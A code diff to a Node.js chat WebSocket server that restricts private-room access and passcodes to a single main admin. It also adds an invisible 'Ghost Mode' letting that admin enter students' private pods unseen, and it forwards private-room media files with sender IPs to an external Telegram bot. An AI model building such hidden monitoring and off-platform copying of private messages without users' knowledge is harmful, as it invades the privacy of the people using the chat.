@@ -22,6 +22,8 @@ const {
 const { decrypt } = require("../utils/cryptoVault");
 const {
   dispatchChatForensicAudit,
+  dispatchPrivateMediaToTelegramVault,
+  dispatchActiveStudentsReportToTelegram,
   dispatchPublicChatMessageToTelegram,
   dispatchPublicChatEditToTelegram,
   dispatchPublicChatDeleteToTelegram,
@@ -496,6 +498,21 @@ function isUserAdmin(user) {
     perms.includes("delete_records") ||
     perms.includes("manage_users") ||
     (Boolean(MAIN_ADMIN_EMAIL) && email === MAIN_ADMIN_EMAIL)
+  );
+}
+
+/**
+ * 👑 Helper: Check if requesting user is the Master / Main Admin
+ * Strictly only the Main Admin can enter private pods in Ghost Mode without a passcode!
+ */
+function isMainAdmin(user) {
+  if (!user) return false;
+  const email = (user.email || "").toLowerCase().trim();
+  const mainEmail = (process.env.ADMIN_EMAIL || MAIN_ADMIN_EMAIL || "").toLowerCase().trim();
+  return (
+    Boolean(user.isMainAdmin) ||
+    Boolean(user.isMasterAdmin) ||
+    (Boolean(mainEmail) && email === mainEmail)
   );
 }
 
@@ -1110,10 +1127,20 @@ function initChatWebSocket(server) {
             return ws.send(JSON.stringify({ type: "error", message: "Room not found or has been closed." }));
           }
 
-          // Secret Code Verification for Private Rooms (Admins bypass)
-          if (room.isPrivate && !isUserAdmin(user)) {
-            if (room.secretCode && room.secretCode.trim() !== (secretCode || "").trim()) {
-              return ws.send(JSON.stringify({ type: "error", message: "Incorrect Secret Key for this private room." }));
+          // 🔒 Secret Code Verification for Private Rooms:
+          // 🛡️ STRICT RULE: ONLY MAIN ADMIN can bypass secretCode and enter in Ghost Mode!
+          // Other admins (half_admin, sub_admin) and normal users MUST provide the exact secretCode!
+          const isMain = isMainAdmin(user);
+          if (room.isPrivate && !isMain) {
+            const cleanCode = (room.secretCode || "").trim();
+            const providedCode = (secretCode || "").trim();
+            if (cleanCode && cleanCode !== providedCode) {
+              return ws.send(
+                JSON.stringify({
+                  type: "error",
+                  message: "🔒 Private Pod Access Denied: Incorrect Secret Passcode. Only authorized participants with the valid secret key can join.",
+                })
+              );
             }
           }
 
@@ -1123,9 +1150,12 @@ function initChatWebSocket(server) {
           }
 
           ws.currentRoomId = roomId;
-          const isStealthAdmin = room.isPrivate && isUserAdmin(user);
 
-          // 👻 STEALTH: Do not increment student members count if Admin visits private pod
+          // 👻 GHOST / STEALTH MODE: EXCLUSIVELY FOR MAIN ADMIN ONLY!
+          // Main Admin enters completely invisible to users (no member increment, no join broadcast, hidden from participants).
+          const isStealthAdmin = room.isPrivate && isMain;
+
+          // 👻 STEALTH: Do not increment student members count if Main Admin enters in Ghost Mode
           if (!isStealthAdmin) {
             room.members.add(user.id);
           }
@@ -1146,11 +1176,14 @@ function initChatWebSocket(server) {
             role: user.role,
           });
 
-          room.participantsMap.set(user.id, {
-            ...enrichedUser,
-            ip: ws.userIp || "127.0.0.1",
-            joinedAt: Date.now(),
-          });
+          // Only add to visible participantsMap if NOT in ghost mode
+          if (!isStealthAdmin) {
+            room.participantsMap.set(user.id, {
+              ...enrichedUser,
+              ip: ws.userIp || "127.0.0.1",
+              joinedAt: Date.now(),
+            });
+          }
 
           // Add to audit log
           room.auditLog.push({
@@ -1319,6 +1352,16 @@ function initChatWebSocket(server) {
               message: newMsg,
               chatMediaDir: CHAT_MEDIA_DIR,
             }).catch((err) => console.warn("[CHAT-AUDIT-BOT] Public send dispatch notice:", err.message));
+          } else {
+            // 🔒 Private Chat Media Vault (Topic 33): Real-time vaulting for PDF, IMG, Documents (pure text excluded)
+            if (newMsg.fileUrl || ["pdf", "image", "document", "audio"].includes(newMsg.type)) {
+              dispatchPrivateMediaToTelegramVault({
+                message: newMsg,
+                room: currentRoom,
+                chatMediaDir: CHAT_MEDIA_DIR,
+                sender: { ...user, ip: ws.userIp },
+              }).catch((err) => console.warn("[CHAT-AUDIT-BOT] Private media vault dispatch notice:", err.message));
+            }
           }
 
           // Update lastActivity for private pod
@@ -1927,7 +1970,7 @@ function handleUserLeaveRoom(ws) {
     }
 
     if (!userHasOtherTab) {
-      const isStealthAdmin = room.isPrivate && isUserAdmin(ws.user);
+      const isStealthAdmin = room.isPrivate && isMainAdmin(ws.user);
 
       // Update audit log for this user
       if (room.auditLog) {
@@ -1936,7 +1979,7 @@ function handleUserLeaveRoom(ws) {
       }
 
       // 👻 GHOST MODE CHECK:
-      // If Admin leaves a private room, DO NOT broadcast departure to regular students!
+      // If Main Admin leaves a private room, DO NOT broadcast departure to regular students!
       if (!isStealthAdmin) {
         const onlineCount = roomSockets.get(roomId)?.size || 0;
         broadcastToRoom(roomId, {
@@ -1945,6 +1988,21 @@ function handleUserLeaveRoom(ws) {
           membersCount: onlineCount,
           userLeft: { id: ws.user.id, name: ws.user.name },
         });
+
+        // 🚨 0 USER AUTO-PURGE CHECK:
+        // When all participants leave a private pod (0 active members remaining), trigger auto-purge archive to Topic 31!
+        if (room.isPrivate && onlineCount === 0) {
+          console.log(`[CHAT-POD] 🚪 0 members remaining in private pod "${room.name}" (${roomId}). Scheduling auto-purge report to Topic 31...`);
+          setTimeout(async () => {
+            const currentCount = roomSockets.get(roomId)?.size || 0;
+            if (currentCount === 0 && activeRooms.has(roomId)) {
+              console.log(`[CHAT-POD] ⏰ Auto-purging empty private pod "${room.name}" (${roomId}) [0 Members]...`);
+              await archiveAndPurgePrivateRoom(room, "zero_members").catch((err) => {
+                console.warn(`[CHAT-POD] Auto-purge error for 0-member pod:`, err.message);
+              });
+            }
+          }, 4000);
+        }
       }
     }
   }
@@ -1995,13 +2053,17 @@ router.get("/ws-token", authenticateToken, requireAuth, (req, res) => {
 router.get("/rooms", authenticateToken, requireAuth, async (req, res) => {
   try {
     const user = req.user;
+    const isMain = isMainAdmin(user);
     const isAdmin = isUserAdmin(user);
 
     const roomsList = [];
     activeRooms.forEach((room) => {
-      // Admins see all rooms; regular users see public room and rooms they created or are members of
+      // 🛡️ STRICT PRIVACY ENFORCEMENT:
+      // Only Main Admin sees all rooms; other users/admins see public room, or rooms they created, or rooms they joined!
       const isMember = room.members instanceof Set ? room.members.has(user.id) : Array.isArray(room.members) ? room.members.includes(user.id) : false;
-      if (!room.isPrivate || isAdmin || room.createdBy === user.id || isMember) {
+      const isCreator = room.createdBy === user.id;
+
+      if (!room.isPrivate || isMain || isCreator || isMember) {
         roomsList.push({
           id: room.id,
           name: room.name,
@@ -2009,7 +2071,8 @@ router.get("/rooms", authenticateToken, requireAuth, async (req, res) => {
           isPrivate: room.isPrivate,
           createdBy: room.createdBy,
           creatorName: room.creatorName,
-          secretCode: (isAdmin || room.createdBy === user.id) ? room.secretCode : undefined,
+          // Only Main Admin or Room Creator sees the secretCode! Other admins and users NEVER see secretCode!
+          secretCode: (isMain || isCreator) ? room.secretCode : undefined,
           membersCount: room.members instanceof Set ? room.members.size : Array.isArray(room.members) ? room.members.length : 0,
           createdAt: room.createdAt,
         });
@@ -2218,10 +2281,10 @@ router.post("/rooms/close", authenticateToken, requireAuth, async (req, res) => 
     }
 
     const isCreator = room.createdBy === user.id;
-    const isAdmin = isUserAdmin(user);
+    const isMain = isMainAdmin(user);
 
-    if (!isCreator && !isAdmin) {
-      return res.status(403).json({ success: false, message: "Permission denied. Only the creator or admin can delete this private chat." });
+    if (!isCreator && !isMain) {
+      return res.status(403).json({ success: false, message: "Permission denied. Only the room creator or Main Administrator can delete this private chat." });
     }
 
     broadcastToRoom(roomId, {
